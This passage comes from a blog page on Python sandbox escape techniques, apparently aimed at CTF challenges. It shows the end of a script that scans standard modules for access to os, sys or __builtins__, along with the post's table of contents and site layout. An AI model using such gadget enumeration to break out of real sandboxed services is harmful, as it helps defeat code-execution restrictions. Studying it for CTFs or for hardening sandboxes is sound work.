class="string">&#x27;_tracemalloc&#x27;</span>, <span class="string">&#x27;gi&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;zipapp&#x27;</span>, <span class="string">&#x27;_warnings&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;_weakref&#x27;</span>, <span class="string">&#x27;grp&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;gtweak&#x27;</span>, <span class="string">&#x27;readline&#x27;</span>, <span class="string">&#x27;zlib&#x27;</span>, <span class="string">&#x27;_yaml&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;reportlab&#x27;</span>, <span class="string">&#x27;zope&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;reprlib&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">methods = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line">results = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> all_modules_3:</span><br><span class="line">    results[module] = &#123;</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;result&#x27;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = <span class="built_in">__import__</span>(module)</span><br><span class="line">        attrs = <span class="built_in">dir</span>(m)</span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">in</span> attrs:</span><br><span class="line">                result = <span class="string">&#x27;yes&#x27;</span></span><br><span class="line">                results[module][<span class="string">&#x27;flag&#x27;</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">&#x27;no&#x27;</span></span><br><span class="line"></span><br><span class="line">            results[module][<span class="string">&#x27;result&#x27;</span>][method] = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">    <span class="keyword">if</span> results[result][<span class="string">&#x27;flag&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + result)</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> results[result][<span class="string">&#x27;result&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;  [-]&#x27;</span> + r + <span class="string">&#x27;: &#x27;</span> + results[result][<span class="string">&#x27;result&#x27;</span>][r])</span><br></pre></td></tr></table></figure>

                </div>
                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/pwn/">pwn</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/sandbox-escape/">sandbox-escape</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/python/">python</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2019/10/08/2019-10-08-Python-Sandbox-Challenges/"
                                   title="Python Sandbox Challenges"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">Python Sandbox Challenges</span>
                                        <span class="post-nav-item">Prev posts</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2019/08/01/2019-08-01-Try-and-Use-WSL/"
                                   title="Try and Use WSL"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">Try and Use WSL</span>
                                        <span class="post-nav-item">Next posts</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    






                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Python2-Sandbox-Escape"><span class="nav-number">1.</span> <span class="nav-text">Python2 Sandbox Escape</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#import-Techniques"><span class="nav-number">1.1.</span> <span class="nav-text">import Techniques</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Ways-to-Import"><span class="nav-number">1.1.1.</span> <span class="nav-text">Ways to Import</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ways-to-Reload"><span class="nav-number">1.1.2.</span> <span class="nav-text">Ways to Reload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Advanced"><span class="nav-number">1.1.3.</span> <span class="nav-text">Advanced</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ultimate"><span class="nav-number">1.1.4.</span> <span class="nav-text">Ultimate</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Explore-Attrs-amp-Methods"><span class="nav-number">1.2.</span> <span class="nav-text">Explore Attrs &amp; Methods</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-String-Scanning"><span class="nav-number">1.3.</span> <span class="nav-text">Bypass String Scanning</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Using-Class-Object"><span class="nav-number">1.4.</span> <span class="nav-text">Using Class Object</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python3-Sandbox-Escape"><span class="nav-number">2.</span> <span class="nav-text">Python3 Sandbox Escape</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Builtin-Functions"><span class="nav-number">2.1.</span> <span class="nav-text">Builtin Functions</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Operations"><span class="nav-number">2.2.</span> <span class="nav-text">File Operations</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Class-Object-Payloads"><span class="nav-number">2.3.</span> <span class="nav-text">Class Object Payloads</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Scripts"><span class="nav-number">2.4.</span> <span class="nav-text">Scripts</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="border-box website-info-box default">
        
            <div class="copyright-info info-item default">
                &copy;&nbsp;<span>2018</span>&nbsp;-&nbsp;2025
                
                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">TyeYeah</a>
                
            </div>

            <div class="theme-info info-item default">
                Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
            </div>

            

            
        

        <div class="count-item info-item default">
            
                <span class="count-box border-box word">
                    <span class="item-type border-box">Total words</span>
                    <span class="item-value border-box word">137k</span>
                </span>
            

            

            
        </div>
    </div>
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            $li-margin-bottom = 0.8rem
$post-tool-button-width = 2.5rem

.post-tools-container {
  padding-top var(--component-gap)

  .tools-list {

    li {
      position relative
      box-sizing border-box
      width $post-tool-button-width
      height $post-tool-button-width
      margin-bottom $li-margin-bottom
      color var(--text-color-3)
      font-size 1.2rem
      background var(--background-color-1)
      border-radius 50%
      box-shadow 2px 2px 5px var(--shadow-color)
      cursor pointer

      &:hover {
        box-shadow 2px 2px 8px var(--shadow-hover-color)
      }

      i {
        color var(--text-color-3)
      }


      &:hover {
        color var(--background-color-1)
        background var(--primary-color)

        i {
          color var(--background-color-1)
        }
      }


      &:last-child {
        margin-bottom 0
      }


      &.toggle-show-toc {
        display none
      }


      &.go-to-comments {
        .post-comments-count {
          position absolute
          top 0
          right -1rem
          display none
          align-items center
          justify-content center
          box-sizing border-box
          min-width 1.1rem
          height 1.1rem
          padding 0 0.2rem
          color var(--badge-color)
          font-size 12px
          background var(--badge-background-color)
          border-radius 0.4rem

          +keep-tablet() {
            display none !important
          }
        }
      }
    }
  }
}

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-toggle-theme-mode flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Python2-Sandbox-Escape"><span class="nav-number">1.</span> <span class="nav-text">Python2 Sandbox Escape</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#import-Techniques"><span class="nav-number">1.1.</span> <span class="nav-text">import Techniques</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Ways-to-Import"><span class="nav-number">1.1.1.</span> <span class="nav-text">Ways to Import</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ways-to-Reload"><span class="nav-number">1.1.2.</span> <span class="nav-text">Ways to Reload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Advanced"><span class="nav-number">1.1.3.</span> <span class="nav-text">Advanced</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ultimate"><span class="nav-number">1.1.4.</span> <span class="nav-text">Ultimate</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Explore-Attrs-amp-Methods"><span class="nav-number">1.2.</span> <span class="nav-text">Explore Attrs &amp; Methods</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-String-Scanning"><span class="nav-number">1.3.</span> <span class="nav-text">Bypass String Scanning</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Using-Class-Object"><span class="nav-number">1.4.</span> <span class="nav-text">Using Class Object</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python3-Sandbox-Escape"><span class="nav-number">2.</span> <span class="nav-text">Python3 Sandbox Escape</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Builtin-Functions"><span class="nav-number">2.1.</span> <span class="nav-text">Builtin Functions</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Operations"><span class="nav-number">2.2.</span> <span class="nav-text">File Operations</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Class-Object-Payloads"><span class="nav-number">2.3.</span> <span class="nav-text">Class Object Payloads</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Scripts"><span class="nav-number">2.4.</span> <span class="nav-text">Scripts</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>



<!-- common -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local-search -->

    
<script src="/js/local-search.js"></script>



<!-- lazyload -->


<div class="">
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        
            
<script src="/js/post/toc.js"></script>

        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
